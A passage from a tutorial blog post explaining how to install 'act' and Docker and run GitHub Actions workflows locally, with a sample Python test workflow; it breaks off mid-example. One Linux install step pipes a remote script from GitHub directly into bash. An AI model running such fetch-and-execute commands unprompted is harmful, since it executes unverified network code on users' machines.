<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-1-installation-and-setup">Part 1: Installation and Setup<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#part-1-installation-and-setup" class="hash-link" aria-label="Direct link to Part 1: Installation and Setup" title="Direct link to Part 1: Installation and Setup" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-install-act-with-pixi-recommended">Step 1: Install <code>act</code> with Pixi (Recommended)<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#step-1-install-act-with-pixi-recommended" class="hash-link" aria-label="Direct link to step-1-install-act-with-pixi-recommended" title="Direct link to step-1-install-act-with-pixi-recommended" translate="no">​</a></h3>
<p>The easiest way to install <code>act</code> globally is using <strong>Pixi</strong>, a fast package manager for Python and system tools:</p>
<p><strong>Install act globally with Pixi:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> act</span><br></span></code></pre></div></div>
<p>That's it! Pixi handles downloading the correct binary for your OS (macOS, Linux, or Windows).</p>
<p><strong>Verify Installation</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: act version 0.2.X</span><br></span></code></pre></div></div>
<p><strong>Why use Pixi?</strong></p>
<ul>
<li class="">✅ Cross-platform (macOS, Linux, Windows)</li>
<li class="">✅ No system dependencies needed</li>
<li class="">✅ One command: <code>pixi global install act</code></li>
<li class="">✅ Automatic updates: <code>pixi global upgrade act</code></li>
<li class="">✅ Isolated from system Python/packages</li>
<li class="">✅ Same tool you use for project management</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="alternative-installation-methods">Alternative Installation Methods<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#alternative-installation-methods" class="hash-link" aria-label="Direct link to Alternative Installation Methods" title="Direct link to Alternative Installation Methods" translate="no">​</a></h3>
<p>If you prefer not to use Pixi, here are other options:</p>
<p><strong>macOS (Homebrew)</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">brew </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> act</span><br></span></code></pre></div></div>
<p><strong>Linux</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Debian/Ubuntu</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> https://raw.githubusercontent.com/nektos/act/master/install.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or with pacman (Arch)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pacman </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-S</span><span class="token plain"> act</span><br></span></code></pre></div></div>
<p><strong>Windows (PowerShell)</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">choco install act</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"># Or if using Scoop:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scoop install act</span><br></span></code></pre></div></div>
<p><strong>Manual Installation</strong></p>
<ul>
<li class="">Download from <a href="https://github.com/nektos/act/releases" target="_blank" rel="noopener noreferrer" class="">GitHub Releases</a></li>
<li class="">Extract to a directory in your <code>$PATH</code></li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-install-docker">Step 2: Install Docker<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#step-2-install-docker" class="hash-link" aria-label="Direct link to Step 2: Install Docker" title="Direct link to Step 2: Install Docker" translate="no">​</a></h3>
<p><code>act</code> requires Docker to run workflows in containers (just like GitHub's cloud runners).</p>
<p><strong>Option 1: Docker Desktop (Easiest)</strong></p>
<ul>
<li class="">Download <a href="https://www.docker.com/products/docker-desktop" target="_blank" rel="noopener noreferrer" class="">Docker Desktop</a> for macOS or Windows</li>
<li class="">Install and start the application</li>
<li class="">Docker will automatically be available in your terminal</li>
</ul>
<p><strong>Option 2: Install Docker with Pixi</strong> (if you prefer package managers)</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install Docker tools in your Pixi environment</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><br></span></code></pre></div></div>
<p><strong>Option 3: Linux (System Package)</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Debian/Ubuntu</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> docker.io </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker-compose</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">usermod</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-aG</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add current user to docker group</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">newgrp </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Activate group changes</span><br></span></code></pre></div></div>
<p><strong>Verify Docker Installation</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run hello-world  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Should complete successfully</span><br></span></code></pre></div></div>
<p><strong>Troubleshooting Docker:</strong></p>
<ul>
<li class="">macOS/Windows: Ensure Docker Desktop is running (check system tray icon)</li>
<li class="">Linux: Check if docker daemon is running: <code>sudo systemctl start docker</code></li>
<li class="">Permission denied: Add user to docker group: <code>sudo usermod -aG docker $USER</code></li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-verify-setup">Step 3: Verify Setup<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#step-3-verify-setup" class="hash-link" aria-label="Direct link to Step 3: Verify Setup" title="Direct link to Step 3: Verify Setup" translate="no">​</a></h3>
<p>Test that <code>act</code> can find your GitHub workflows:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> /path/to/your/repo</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--list</span><br></span></code></pre></div></div>
<p><strong>Expected output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Stage  Job ID  Job Name  Workflow Name     Workflow File           Events</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">0      test    test      test-workflow     .github/workflows/test.yml  push</span><br></span></code></pre></div></div>
<p>If no workflows appear, ensure <code>.github/workflows/</code> exists with <code>.yml</code> files.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-4-pixi-integration-optional-but-recommended">Step 4: Pixi Integration (Optional but Recommended)<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#step-4-pixi-integration-optional-but-recommended" class="hash-link" aria-label="Direct link to Step 4: Pixi Integration (Optional but Recommended)" title="Direct link to Step 4: Pixi Integration (Optional but Recommended)" translate="no">​</a></h3>
<p>If your project uses Pixi, add <code>act</code> as a task for easy execution:</p>
<p><strong>Add to <code>pixi.toml</code>:</strong></p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[tasks]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ci = "act push"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ci-test = "act pull_request"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ci-debug = "act -v push"</span><br></span></code></pre></div></div>
<p><strong>Then run with Pixi:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run ci           </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run GitHub Actions locally</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run ci-debug     </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># With verbose output</span><br></span></code></pre></div></div>
<p><strong>Check your Pixi setup:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi info</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Should show: act is available globally</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-2-basic-usage---running-workflows-locally">Part 2: Basic Usage - Running Workflows Locally<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#part-2-basic-usage---running-workflows-locally" class="hash-link" aria-label="Direct link to Part 2: Basic Usage - Running Workflows Locally" title="Direct link to Part 2: Basic Usage - Running Workflows Locally" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="simple-example-python-test-workflow">Simple Example: Python Test Workflow<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#simple-example-python-test-workflow" class="hash-link" aria-label="Direct link to Simple Example: Python Test Workflow" title="Direct link to Simple Example: Python Test Workflow" translate="no">​</a></h3>
<p>Let's create a minimal GitHub Actions workflow and test it with <code>act</code>.</p>
<p><strong>Create <code>.github/workflows/test.yml</code>:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Python Tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">push</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">branches</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">main</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> develop</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jobs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/checkout@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Set up Python</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/setup</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">python@v4</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">with</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">python-version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.12'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Install dependencies</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          pip install pytest numpy pandas</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Run tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          pytest tests/ -v</span><br></span></code></pre></div></div>
<p><strong>Run locally with act:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push</span><br></span></code></pre></div></div>
<p><strong>Expected output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[Python Tests/test] 🚀 Start image pull...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[Python Tests/test] 🐳 Docker pull requested ghcr.io/catthehacker/ubuntu:act-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[Python Tests/test] ✓ Image pull complete</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[Python Tests/test] 🚀 Start container...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[Python Tests/test] ⭐ Run Main actions/checkout@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[Python Tests/test] ✓ Complete job</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-specific-workflows">Running Specific Workflows<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#running-specific-workflows" class="hash-link" aria-label="Direct link to Running Specific Workflows" title="Direct link to Running Specific Workflows" translate="no">​</a></h3>
<p><strong>List all available workflows:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--list</span><br></span></code></pre></div></div>
<p><strong>Run a specific job:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--job</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><br></span></code></pre></div></div>
<p><strong>Run a specific workflow:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--workflow</span><span class="token plain"> test.yml</span><br></span></code></pre></div></div>
<p><strong>Simulate a different event (e.g., pull_request):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act pull_request</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-3-environment-variables-and-secrets">Part 3: Environment Variables and Secrets<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#part-3-environment-variables-and-secrets" class="hash-link" aria-label="Direct link to Part 3: Environment Variables and Secrets" title="Direct link to Part 3: Environment Variables and Secrets" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="passing-environment-variables">Passing Environment Variables<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#passing-environment-variables" class="hash-link" aria-label="Direct link to Passing Environment Variables" title="Direct link to Passing Environment Variables" translate="no">​</a></h3>
<p><code>act</code> provides several ways to pass variables:</p>
<p><strong>Method 1: Command-line flag</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> event.json</span><br></span></code></pre></div></div>
<p>Where <code>event.json</code> contains:</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token property" style="color:hsl(5, 74%, 59%)">"repository"</span><span class="token operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token property" style="color:hsl(5, 74%, 59%)">"name"</span><span class="token operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"my-repo"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token property" style="color:hsl(5, 74%, 59%)">"owner"</span><span class="token operator" style="color:hsl(221, 87%, 